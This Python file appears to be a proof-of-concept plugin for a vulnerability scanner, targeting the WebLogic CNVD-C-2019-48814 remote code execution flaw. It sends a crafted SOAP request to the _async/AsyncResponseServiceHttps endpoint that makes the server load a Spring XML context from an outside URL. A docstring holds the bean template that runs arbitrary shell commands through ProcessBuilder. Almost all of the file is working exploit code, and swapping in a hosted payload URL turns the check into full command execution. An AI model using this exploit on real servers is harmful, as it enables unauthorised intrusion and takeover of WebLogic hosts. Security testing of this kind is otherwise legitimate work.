#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

'''
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>sh</value>
                <value>-c</value>
                <value><![CDATA[
                执行的命令
                ]]></value>
            </list>
            </constructor-arg>
        </bean>
 </beans>
'''

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'CNVD-C-2019-48814'
        self.keyword = ['weblogic']
        self.info = 'CNVD-C-2019-48814'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        self.refer = 'http://www.cnvd.org.cn/webinfo/show/4999'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            poc = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
    <void><string>http://www.baidu.com/</string></void>
    </class></java>
    </work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
            '''
            url = self.base_url + '_async/AsyncResponseServiceHttps'
            headers = {"Content-Type": "text/xml"}
            async with ClientSession() as session:
                async with session.post(url=url, headers=headers, data=poc, timeout=8) as res:
                    if res and res.status == 202:
                        self.flag = 1
                        self.req.append({"page": '/_async/AsyncResponseServiceHttps'})
                        self.res.append({"info": url, "key": '/_async/AsyncResponseServiceHttps'})
                        return



